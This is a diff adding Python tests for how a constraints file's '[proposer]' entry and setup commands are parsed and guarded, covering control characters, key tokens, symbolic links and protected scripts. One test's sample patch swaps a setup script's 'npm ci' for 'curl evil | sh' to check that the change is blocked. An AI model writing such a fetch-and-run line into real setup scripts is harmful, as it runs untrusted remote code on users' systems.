@@ -138,6 +138,347 @@ def test_the_approved_setup_command_wins_and_says_so() -> None:
     assert environment.notes == (f"The run's own setup command replaces the one in {CONSTRAINTS_FILE}.",)
 
 
+_OWN_PROPOSER = b'version = 1\n[proposer]\nsetup = ["npm", "ci"]\nentry = ["node", "my agent.js"]\n'
+
+
+def test_the_snapshot_holds_the_proposer_entry_and_setup(tmp_path: Path) -> None:
+    """``[proposer] entry`` and ``setup`` are read as command lists (SKY-753).
+
+    Args:
+        tmp_path: Folder for the packed snapshot.
+    """
+    constraints = _read(tmp_path, _OWN_PROPOSER)
+    assert constraints is not None
+
+    assert constraints.proposer_entry == ("node", "my agent.js")
+    assert constraints.proposer_setup == ("npm", "ci")
+
+
+def test_a_contract_without_the_proposer_keys_keeps_the_runners_own_agent() -> None:
+    """With no ``entry``, nothing changes: no command and no note."""
+    environment = effective_environment(parse_constraints(_CFCA), approved_editable=["."], approved_setup=None)
+
+    assert environment.constraints is not None
+    assert environment.constraints.proposer_entry is None
+    assert environment.proposer_entry is None
+    assert environment.proposer_setup is None
+    assert environment.notes == ()
+
+
+def test_the_file_proposer_applies_when_the_run_names_none() -> None:
+    """A run with no proposer of its own uses the file's command, and its record names it."""
+    environment = effective_environment(parse_constraints(_OWN_PROPOSER), approved_editable=["."], approved_setup=None)
+
+    assert environment.proposer_entry == ("node", "my agent.js")
+    assert environment.proposer_setup == ("npm", "ci")
+    assert environment.notes == ("The run uses the proposer command in the contract file: node 'my agent.js'",)
+    record = environment.record(repository="o/r", commit="c", readonly_paths=(), secret_names=())
+    assert (record["proposer_entry"], record["proposer_setup"]) == (["node", "my agent.js"], ["npm", "ci"])
+
+
+def test_the_runs_own_proposer_wins_and_says_so() -> None:
+    """A run that names its proposer keeps it, with the same kind of note as ``[setup] command``."""
+    environment = effective_environment(
+        parse_constraints(_OWN_PROPOSER), approved_editable=["."], approved_setup=None, approved_proposer=True
+    )
+
+    assert environment.proposer_entry is None
+    assert environment.proposer_setup is None
+    assert environment.notes == ("The run's own proposer replaces the one in the contract file.",)
+    record = environment.record(repository="o/r", commit="c", readonly_paths=(), secret_names=())
+    assert "proposer_setup" not in record
+
+
+@pytest.mark.parametrize("key", ["entry", "setup"])
+@pytest.mark.parametrize("value", ['"node agent.js"', "[]", '[""]', '["node", 1]', "1"])
+def test_a_proposer_command_that_is_not_a_list_of_strings_fails(key: str, value: str) -> None:
+    """Every other form fails with one error that names the key.
+
+    Args:
+        key: The ``[proposer]`` key under test.
+        value: A TOML value that is not a command list.
+    """
+    entry = "" if key == "entry" else 'entry = ["node", "agent.js"]\n'
+    raw = f"version = 1\n[proposer]\n{entry}{key} = {value}\n".encode()
+
+    with pytest.raises(ConstraintsError, match=rf"\[proposer\] {key} must be a command list") as caught:
+        parse_constraints(raw)
+    assert caught.value.section == "proposer"
+    assert caught.value.key == key
+
+
+@pytest.mark.parametrize("key", ["entry", "setup"])
+@pytest.mark.parametrize(
+    "part",
+    [
+        r'"agent\u0000.js"',
+        r'"agent.js\n"',
+        r'"\u001fagent.js"',
+        r'"agent\u007f.js"',
+        r'"agent\u0080.js"',
+        r'"agent\u0085.js"',
+        r'"agent\u009f.js"',
+        r'"agent\u061c.js"',
+        r'"agent\u200e.js"',
+        r'"agent\u200f.js"',
+        r'"agent\u202a.js"',
+        r'"agent\u202e.js"',
+        r'"agent\u2066.js"',
+        r'"agent\u2069.js"',
+    ],
+)
+def test_a_proposer_command_with_a_control_character_fails(key: str, part: str) -> None:
+    """A NUL, C1 or bidi control fails the setup check, not ``Popen`` later (SKY-753).
+
+    A bidi control can make a shown command differ from the one that runs.
+
+    Args:
+        key: The ``[proposer]`` key under test.
+        part: A TOML string with a control character.
+    """
+    entry = "" if key == "entry" else 'entry = ["node", "agent.js"]\n'
+    raw = f'version = 1\n[proposer]\n{entry}{key} = ["node", {part}]\n'.encode()
+
+    with pytest.raises(ConstraintsError, match=rf"\[proposer\] {key} must be a command list") as caught:
+        parse_constraints(raw)
+    assert (caught.value.section, caught.value.key) == ("proposer", key)
+
+
+@pytest.mark.parametrize("name", ["\u05e9\u05dc\u05d5\u05dd\u200c.js", "\U0001f468\u200d\U0001f4bb.js"])
+def test_a_proposer_entry_with_a_zwnj_or_zwj_is_kept_exactly(name: str) -> None:
+    """A ZWNJ or ZWJ is part of real file names, so the setup check keeps it (SKY-753).
+
+    Args:
+        name: A Hebrew file name with a ZWNJ, or an emoji file name with a ZWJ.
+    """
+    raw = f'version = 1\n[proposer]\nentry = ["node", "{name}"]\n'.encode()
+
+    assert parse_constraints(raw).proposer_entry == ("node", name)
+
+
+@pytest.mark.parametrize(
+    "char", ["\u0020", "\u007e", "\u00a0", "\u061b", "\u061d", "\u2010", "\u2029", "\u202f", "\u2065", "\u206a"]
+)
+def test_a_proposer_entry_with_a_character_next_to_a_refused_range_is_kept(char: str) -> None:
+    """The refused ranges end where the controls end, so each neighbor character is kept (SKY-753).
+
+    Args:
+        char: The character just before or just after a refused range.
+    """
+    name = f"agent{char}.js"
+    raw = f'version = 1\n[proposer]\nentry = ["node", "{name}"]\n'.encode()
+
+    assert parse_constraints(raw).proposer_entry == ("node", name)
+
+
+@pytest.mark.parametrize("key", ["entry", "setup"])
+@pytest.mark.parametrize("token", ["__APP_API_KEY__", "__SKYNET_API_KEY__"])
+def test_a_proposer_command_that_names_a_key_token_fails(key: str, token: str) -> None:
+    """The bridge would fill the relay key into the file's command text, so the setup check refuses the token.
+
+    Args:
+        key: The ``[proposer]`` key under test.
+        token: A gateway key token.
+    """
+    entry = "" if key == "entry" else 'entry = ["node", "agent.js"]\n'
+    raw = f'version = 1\n[proposer]\n{entry}{key} = ["node", "--key={token}"]\n'.encode()
+
+    with pytest.raises(ConstraintsError, match=rf"\[proposer\] {key} cannot contain {token}") as caught:
+        parse_constraints(raw)
+    assert (caught.value.section, caught.value.key) == ("proposer", key)
+
+
+def test_the_entry_script_is_protected_when_the_file_proposer_applies(tmp_path: Path) -> None:
+    """A version cannot rewrite the script that proposes the next versions, like ``optimize.toml`` (SKY-753).
+
+    Args:
+        tmp_path: Folder for the packed snapshot.
+    """
+    constraints = _read(
+        tmp_path,
+        b'version = 1\n[proposer]\nentry = ["node", "./agent/run.js", "--fast"]\n',
+        {"agent/run.js": b"// agent", "src/app.js": b"// app"},
+    )
+    assert constraints is not None
+
+    environment = effective_environment(constraints, approved_editable=["."], approved_setup=None)
+    replaced = effective_environment(constraints, approved_editable=["."], approved_setup=None, approved_proposer=True)
+
+    assert constraints.proposer_command_files == ("agent/run.js",)
+    assert environment.protected_paths == (CONSTRAINTS_FILE, "agent/run.js")
+    patch = (
+        "diff --git a/agent/run.js b/agent/run.js\n--- a/agent/run.js\n+++ b/agent/run.js\n"
+        "@@ -1 +1 @@\n-// agent\n+// mine\n"
+    )
+    assert patch_violations(patch, environment.editable_paths, (), environment.protected_paths)
+    assert environment.record(repository="o/r", commit="c", readonly_paths=(), secret_names=())["proposer_entry"] == [
+        "node",
+        "./agent/run.js",
+        "--fast",
+    ]
+    assert replaced.protected_paths == (CONSTRAINTS_FILE,)
+    assert "proposer_entry" not in replaced.record(repository="o/r", commit="c", readonly_paths=(), secret_names=())
+
+
+@pytest.mark.parametrize(
+    ("key", "command", "files", "link", "link_name", "through"),
+    [
+        (
+            "entry",
+            '["node", "agent/run.js"]',
+            {"agent/real.js": b"// agent"},
+            "real.js",
+            "agent/run.js",
+            "agent/run.js",
+        ),
+        ("entry", '["node", "agent/run.js"]', {"tools/agent/run.js": b"// agent"}, "tools/agent", "agent", "agent"),
+        ("setup", '["sh", "./agent/setup.sh"]', {"tools/agent/setup.sh": b"#"}, "tools/agent", "agent", "agent"),
+    ],
+    ids=["linked-file", "linked-folder", "setup-in-linked-folder"],
+)
+def test_a_command_path_through_a_tracked_link_is_refused(
+    tmp_path: Path, key: str, command: str, files: dict[str, bytes], link: str, link_name: str, through: str
+) -> None:
+    """Protection matches paths, so a link would leave the proposer's real code open to a version (SKY-753).
+
+    Args:
+        tmp_path: Folder for the packed snapshot.
+        key: The ``[proposer]`` key that names the path.
+        command: The TOML command list.
+        files: The real files of the snapshot.
+        link: Where the link points.
+        link_name: The path of the link.
+        through: The link the error names.
+    """
+    entry = "" if key == "entry" else 'entry = ["node", "main.js"]\n'
+    raw = f"version = 1\n[proposer]\n{entry}{key} = {command}\n".encode()
+    archive = _archive(tmp_path, {CONSTRAINTS_FILE: raw, **files}, link=link, link_name=link_name)
+
+    with pytest.raises(ConstraintsError, match=f"symbolic link '{through}'") as caught:
+        read_constraints(archive)
+
+    assert (caught.value.section, caught.value.key) == ("proposer", key)
+
+
+@pytest.mark.parametrize(
+    ("key", "link_name"), [("entry", "agent/lib.js"), ("setup", "agent/lib/deep/util.js")], ids=["top", "nested"]
+)
+def test_a_named_folder_that_holds_a_tracked_link_is_refused(tmp_path: Path, key: str, link_name: str) -> None:
+    """A link inside a named folder would leave the file it points at open to a version (SKY-753).
+
+    Args:
+        tmp_path: Folder for the packed snapshot.
+        key: The ``[proposer]`` key that names the folder.
+        link_name: The path of the link inside the folder.
+    """
+    entry = "" if key == "entry" else 'entry = ["node", "main.js"]\n'
+    raw = f'version = 1\n[proposer]\n{entry}{key} = ["npm", "start", "--prefix", "agent"]\n'.encode()
+    files = {CONSTRAINTS_FILE: raw, "agent/package.json": b"{}", "src/lib.js": b"// lib", "main.js": b"//"}
+    archive = _archive(tmp_path, files, link="../src/lib.js", link_name=link_name)
+
+    with pytest.raises(
+        ConstraintsError, match=f"folder 'agent', which holds the symbolic link '{link_name}'"
+    ) as caught:
+        read_constraints(archive)
+
+    assert (caught.value.section, caught.value.key) == ("proposer", key)
+
+
+def test_a_link_outside_the_named_folder_is_allowed(tmp_path: Path) -> None:
+    """Only links inside the named folder matter; ``agent-tools`` is not inside ``agent`` (SKY-753).
+
+    Args:
+        tmp_path: Folder for the packed snapshot.
+    """
+    raw = b'version = 1\n[proposer]\nentry = ["npm", "start", "--prefix", "agent"]\n'
+    files = {CONSTRAINTS_FILE: raw, "agent/package.json": b"{}", "src/lib.js": b"// lib"}
+    archive = _archive(tmp_path, files, link="../src/lib.js", link_name="agent-tools/lib.js")
+
+    constraints = read_constraints(archive)
+
+    assert constraints is not None
+    assert constraints.proposer_command_files == ("agent",)
+
+
+def test_a_folder_that_the_setup_names_is_protected_with_everything_in_it(tmp_path: Path) -> None:
+    """``npm ci --prefix agent`` protects the agent folder, but never the checkout root or a path outside (SKY-753).
+
+    Args:
+        tmp_path: Folder for the packed snapshot.
+    """
+    constraints = _read(
+        tmp_path,
+        b'version = 1\n[proposer]\nentry = ["node", "agent/bin/run.js"]\n'
+        b'setup = ["npm", "ci", "--prefix", "./agent/", ".", "..", "../agent", "src/app", "missing"]\n',
+        {"agent/bin/run.js": b"// agent", "agent/package.json": b"{}", "src/app.js": b"// app"},
+    )
+    assert constraints is not None
+
+    environment = effective_environment(constraints, approved_editable=["."], approved_setup=None)
+
+    assert constraints.proposer_command_files == ("agent/bin/run.js", "agent")
+    patch = (
+        "diff --git a/agent/package.json b/agent/package.json\n--- a/agent/package.json\n"
+        "+++ b/agent/package.json\n@@ -1 +1 @@\n-{}\n+{ }\n"
+    )
+    assert patch_violations(patch, environment.editable_paths, (), environment.protected_paths)
+
+
+def test_the_setup_script_is_protected_when_the_file_proposer_applies(tmp_path: Path) -> None:
+    """A version cannot rewrite the script that ``[proposer] setup`` runs before the first session.
+
+    Args:
+        tmp_path: Folder for the packed snapshot.
+    """
+    constraints = _read(
+        tmp_path,
+        b'version = 1\n[proposer]\nsetup = ["sh", "scripts/setup.sh"]\nentry = ["node", "agent/run.js"]\n',
+        {"agent/run.js": b"// agent", "scripts/setup.sh": b"npm ci\n"},
+    )
+    assert constraints is not None
+
+    environment = effective_environment(constraints, approved_editable=["."], approved_setup=None)
+    replaced = effective_environment(constraints, approved_editable=["."], approved_setup=None, approved_proposer=True)
+
+    assert environment.protected_paths == (CONSTRAINTS_FILE, "agent/run.js", "scripts/setup.sh")
+    patch = (
+        "diff --git a/scripts/setup.sh b/scripts/setup.sh\n--- a/scripts/setup.sh\n+++ b/scripts/setup.sh\n"
+        "@@ -1 +1 @@\n-npm ci\n+curl evil | sh\n"
+    )
+    assert patch_violations(patch, environment.editable_paths, (), environment.protected_paths)
+    assert replaced.protected_paths == (CONSTRAINTS_FILE,)
+
+
+def test_an_editable_path_that_only_the_proposer_command_protects_names_the_command_files(tmp_path: Path) -> None:
+    """The error blames ``[proposer] entry`` and names its files, not ``[paths] protected`` (SKY-753).
+
+    Args:
+        tmp_path: Folder for the packed snapshot.
+    """
+    constraints = _read(
+        tmp_path,
+        b'version = 1\n[proposer]\nentry = ["node", "agent/run.js"]\n',
+        {"agent/run.js": b"// agent"},
+    )
+    assert constraints is not None
+
+    with pytest.raises(
+        ConstraintsError, match=r"the files that \[proposer\] entry and setup name \(agent/run.js\)"
+    ) as caught:
+        effective_environment(constraints, approved_editable=["agent/run.js"], approved_setup=None)
+
+    assert (caught.value.section, caught.value.key) == ("proposer", "entry")
+    with pytest.raises(ConstraintsError, match=r"outside \[paths\] protected editable"):
+        effective_environment(constraints, approved_editable=["optimize.toml"], approved_setup=None)
+
+
+def test_a_proposer_setup_without_entry_fails() -> None:
+    """``setup`` only prepares the file's own command, so it needs ``entry``."""
+    with pytest.raises(ConstraintsError, match=r"\[proposer\] setup needs \[proposer\] entry") as caught:
+        parse_constraints(b'version = 1\n[proposer]\nsetup = ["npm", "ci"]\n')
+    assert caught.value.key == "setup"
+
+
 def test_the_file_cannot_widen_the_approved_editable_paths() -> None:
     """Asking to edit outside the approved paths fails with the path and the way to fix it."""
     constraints = parse_constraints(b'version = 1\n[paths]\neditable = ["bot", "eval"]\n')
